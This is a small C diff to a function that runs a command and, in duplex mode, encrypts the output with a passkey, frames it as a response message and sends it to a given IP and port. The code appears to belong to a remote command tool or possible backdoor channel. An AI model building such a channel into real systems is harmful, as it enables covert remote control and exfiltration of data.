@@ -129,9 +129,13 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 		if (duplex)
 		{
 			char *enc = out;
+
 			int len = strlen(out);
 
 			enc = encrypt(PASSKEY, out, len);
+
+			enc = buildTransmission(enc, &len, RSP_TYP);
+
 			sendto(sock, enc, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
 			free(enc);
